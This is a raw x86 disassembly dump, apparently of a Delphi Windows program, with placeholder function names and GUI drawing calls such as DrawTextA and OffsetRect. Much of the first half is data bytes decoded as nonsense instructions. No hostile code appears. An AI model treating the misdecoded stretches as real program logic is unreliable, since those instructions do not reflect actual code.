or al 0x44
fld [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor dh bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 8 ] ah
inc esp
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
dec esi
popad
jae r-xdata
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
lea eax [ ecx ]
mov al [ 0x540044b0 ]
test [ eax + eax - 0x34 ] al
jb r-xdata
mov eax eax
sbb bl 0x43
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
outsd
je r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x18ff0001 ] ah
stc
inc esp
add [ ecx + edi * 8 ] bh
inc esp
sbb al 0x37
dec eax
and al 0x42
add [ eax ] dh
add [ eax ] al
add [ eax ] 0x0
aas
inc esp
add [ eax + eax ] dh
push edi
inc ecx
inc ebp
add [ eax ] bl

popad
jae r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
call 0x13442371
add al [ eax ]
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
call 0x684422d5
add [ eax ] al
add [ gs : eax ] dl
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ esp + ebx + 0x37 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
jmp [ eax - 0x4fffbb70 ]
jae r-xdata
add al bh
add al 0x44
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 + 0x5c00044 ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al bl
mov esi 0xcc780044
inc esp
add al ah
or [ eax + eax - 0x64 ] eax
or al [ eax + eax + 0xc ]
or eax [ eax + eax + 0x10 ]
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ eax - 0x13ffbbf5 ] dh
test [ eax + eax - 0x44 ] 0xc00044d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x60 ] 0xdc004405
pop es
inc esp
add [ eax + 0x44004407 ] bl
or [ eax + eax + 0xc ] eax
or [ eax + eax - 0x44 ] al
pop es
inc esp
add [ eax + 0x8 ] dh
inc esp
add [ eax + 0x8004408 ] ch
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
or al 0xd
inc esp
add [ ebp + ecx + 0x44 ] cl
add al cl
or eax 0xd800044
inc esp
add [ eax + 0x400440d ] ch
push cs
inc esp
add [ esi + ecx ] bh
inc esp
add [ eax + 0xb00440c ] dh
push esp
inc ebx
jne r-xdata
inc edx
add [ eax - 0x23ffbdef ] ah
adc al 0x42
insb
jae r-xdata
add bh bh
mov al [ 0xffffffffb0004490 ]
nop
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
outsb
je r-xdata
jb r-xdata
rol [ eax + 0x43db ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
fadd [ ebx ]
adc [ eax ] al
adc [ edx ] eax
add bh bh
or al 0x6
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ 0x65646948 ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
mov ah 0x4c
inc esp
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
pop ds
add [ edi ] al
dec ecx
insd
dec ebp
outsd
inc esp
dec ebp
inc esp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070020 ] al
insd
dec esi
popad
insd
cmp al 0x10
inc eax
add [ eax ] cl
add al [ eax ]
jmp [ eax ]
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub_43e759
sbb al [ eax + eax + 0x54 ]
test [ eax + eax - 0x34 ] al
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + edx + 0x44 ] dl
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add [ edi + edx - 0x4cdfffbc ] al
inc esp
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al bl
mov esi 0xcc780044
inc esp
add [ esi + eax * 8 + 0x44 ] ah
add [ eax - 0x37 ] ah
inc esp
add ah ch
sbb al [ eax + eax + 0x10 ]
int 0x44
add [ ecx * 8 + 0x11d00044 ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x44 ] 0xc00044d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x38 ] 0x8000441c
adc al [ eax + eax - 0x54 ]
adc al [ eax + eax - 0x24 ]
sbb al 0x44
add [ ecx + edx + 0x1c040044 ] ah
inc esp
add [ eax ] dl
sbb al 0x44
add [ esp + ebx + 0x47ac0044 ] bl
inc ebp
add ah dh
adc [ eax + eax + 0x24 ] eax
sbb eax [ eax + eax - 0x58 ]
adc al 0x44
add [ ecx + ebp + 0x40 ] bl
add [ ecx + ebp + 0x40 ] bl
add al ch
adc al [ eax + eax + 0x5c ]
sub [ eax ] eax
aam 0x1c
inc esp
add al ah
sbb eax [ eax + eax + 0xd ]
add [ ecx ] al
add [ eax + esi * 4 ] al
adc [ eax + 0x2bbd11 ] dh
sub al 0x0
sub eax 0xb3008700
push [ edx - 0x4f004e01 ]
push [ ebp + 0x4412f8ff ]
add [ eax + 0x13 ] bl
inc esp
add [ ebx + edx + 0x44 ] ch
add [ eax + ebx + 0x131c0044 ] dl
inc esp
add [ ebx + edx ] ah
inc esp
add [ ebx + edx ] ch
inc esp
add [ ebx + edx ] dh
inc esp
add [ eax ] al
sbb al [ eax + eax - 0x40 ]
sbb al [ eax + eax + 0x24 ]
sbb al [ eax + eax - 0x60 ]
sbb al [ eax + eax + 0x6c ]
sbb al [ eax + eax + 0xc ]
push esp
inc ebx
jne r-xdata
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
test al 0x15
inc edx
add [ ebx + 0x15dc0044 ] dh
je r-xdata
add [ eax + 0x3000441d ] dl
jg r-xdata
add [ eax ] dl
push ss
inc edx
add [ edi + edi * 2 + 0x15600044 ] dl
inc edx
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x34004215 ] ch
sbb eax 0x15dc0044
insd
inc ebx
outsd
insd
bound ebp [ edi - 0x73 ]
inc eax
add al al
call 0xc4ae905
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
0xeaf60043 0x43
add al bh
pop ecx
inc ebp
add al dh
mov ah 0x44
add [ eax + eax * 4 ] ah
inc esp
add [ eax + eax * 4 + 0x44 ] ah
add [ eax + 0x7f ] dl
inc esp
add [ edx + ebx * 2 ] cl
inc ebp
add [ eax ] dl
pop edx
inc ebp
add [ edi + edi * 2 + 0x44 ] dh
add ah ah
jl r-xdata
add [ eax + 0x1d ] bl
inc esp
add [ eax + 0x7e ] cl
inc esp
add [ ecx + ebx * 2 + 0x45 ] bl
add al ch
mov ah 0x44
add al al
jg r-xdata
jle r-xdata
je r-xdata
add [ ebx + esi + 0x40 ] bh
add ah bh
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] ch
mov dh 0x44
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
mov bh 0x44
add [ ecx ] dl
push esp
inc edx
jne r-xdata
add [ esi + edi * 2 + 0x44 ] bh
add [ ecx + ebx * 2 + 0x59c00045 ] ch
inc ebp
add [ esi + edi * 2 + 0x59e80044 ] dh
inc ebp
add [ eax ] dl
jg r-xdata
add al ch
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x4c ]
out 0x43 eax
add ah bl
pop esp
inc esp
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
add [ eax - 0x2d ] dl
inc esp
add al al
je r-xdata
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add ah dh
sbb eax 0xfe040044
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add al al
push ds
inc esp
add [ eax ] ah
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al bl
mov esi 0xcc780044
inc esp
add [ eax + 0x6000441f ] dh
leave
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x44 ] 0xc00044d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x68 ] 0xbc00441e
push ds
inc esp
add [ eax + eax ] al
cmp [ ebp - 0x10ffec ] bh
fcos
cmp [ edi ] bl
inc esp
add [ edi + ebx + 0x1e480044 ] al
inc esp
add [ eax + 0xe00441e ] dl
push esp
inc edx
jne r-xdata
lea eax [ eax + eax - 0x2c ]
adc al 0x42
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
jg r-xdata
inc ebx
je r-xdata
dec eax
jmp [ ecx + 0x44 ]
test [ ebx ] dh
inc eax
outsb
inc ebx
outsd
outsb
je r-xdata
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
inc esp
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xea0cc08b
inc ebx
inc edx
add ah dh
adc eax 0x16480042
inc edx
add ah dl
add [ eax + 0x15 ] ah
jge r-xdata
insb
jae r-xdata
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] ch
mov dh 0x44
add al dh
add al [ ebp ]
sbb bl cl
outsd
insb
lea eax [ eax ]
or al 0xeb
inc ebx
add [ edi ] al
push cs
push esp
inc edx
jne r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
jmp 0x6fe94d
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
je r-xdata
add [ eax ] bl

outsb
inc ebx
outsd
outsb
je r-xdata
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
mov al [ 0x540044b0 ]
test [ eax + eax - 0x34 ] al
outsd
insb
or al 0xea
inc ebx
add [ edx + edx * 2 + 0x44 ] bl
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
inc ebx
je r-xdata
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add al ch
pop ds
inc esp
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add al al
push ds
inc esp
add [ eax ] ah
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al bl
mov esi 0xcc780044
inc esp
add ah bh
and [ eax + eax + 0x60 ] al
leave
inc esp
add [ eax ] bh
and [ eax + eax + 0x10 ] eax
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x44 ] 0xc00044d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x68 ] 0xbc00441e
push ds
inc esp
add [ eax + 0x44 ] dh
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
insb
jae r-xdata
add [ ebp - 0x147fffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
in al dx
inc ebx
add [ esi + 0x180043ec ] al
add al [ eax ]
add al al
jmp 0x14ffeba5
sub_43f0e5
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
dec ebx
jns r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
loopne r-xdata
jo r-xdata
inc eax
inc esp
add al bl
push 0xe0004441
add [ eax ] eax
jmp eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
inc eax
inc esp
add al dl
adc al 0x2
push ebp
jo r-xdata
add [ eax ] al
shr cl 0x43
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
popad
dec ebp
outsd
jbe r-xdata
arpl [ ebx - 0x74 ] bp
inc edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
inc esp
outsd
ja r-xdata
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
inc esp
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
outsb
push ebx
je r-xdata
dec edi
inc eax
inc eax
inc esp
add al ah
add [ eax ] al
jmp eax
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
jb r-xdata
add [ eax ] al
mov eax 0xd8004440
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] ch
mov dh 0x44
jb r-xdata
add [ ebx ] ah
inc esp
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add al al
push ds
inc esp
add [ eax ] ah
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al bl
mov esi 0xcc780044
inc esp
add [ 0xffffffffc9600044 ] dl
inc esp
add [ ebp + 0x44 ] ch
add [ eax ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x44 ] 0xc00044d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x7c ] 0x88004423
and al 0x44
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0x98ff
mov al [ 0xffffffffdc004211 ]
adc al 0x42
inc esp
jb r-xdata
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
inc esp
inc esp
outsd
int3
push eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 8 + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
inc ebx
add [ edx ] bh
inc ebx
add [ edx + eax ] dl
sub_43f968
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451480
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_448740
mov edx 0x69
mov eax esi
call sub_448764
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_43f9c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b844
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_42517c
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_4250d8
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_43fa30
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_43fdd2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_42517c
call sub_43c760
call sub_43c840
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_4250d8
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_448fac
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_4170c4
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_4170c4
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x54 ]
call sub_404178
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x58 ]
call sub_404378
push eax
mov eax edi
call sub_425280
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_4170c4
mov eax ebx
mov si 0xffc8
call sub_403324
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_424a38
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_424a38
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_424ea8
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_424a38
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_425280
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fdd9
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403edc
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403edc
lea eax [ ebp - 0x60 ]
call sub_4045c4
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403edc
retn
mov eax ebx
mov si 0xffc8
call sub_403324
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_424ea8
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_448fac
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_448fac
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_4250bc
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_4170c4
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_4170c4
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_448fac
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404710
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_425280
push eax
call sub_43c760
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43ca40
jmp r-xdata
call sub_43c760
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_43caa4
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_425280
push eax
call sub_43c760
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43c94c
push 0x0
mov eax edi
call sub_425280
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_448fac
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_44b2c4
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x80 ]
call sub_404178
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x84 ]
call sub_404378
push eax
mov eax edi
call sub_425280
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_424a38
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x88 ]
call sub_404178
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x8c ]
call sub_404378
push eax
mov eax edi
call sub_425280
push eax
call DrawTextA
sub_43fde3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43fe5e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448fac
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_460768
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44ec5c
mov eax ebx
mov si 0xffb8
call sub_403324
test al al
je r-xdata
mov eax ebx
call sub_44fd38
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fe65
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_43feb0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_450a00
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_448740
mov edx 0x11
mov eax esi
call sub_448764
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_43c760
call sub_43c840
test al al
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_43ff5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4400b2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
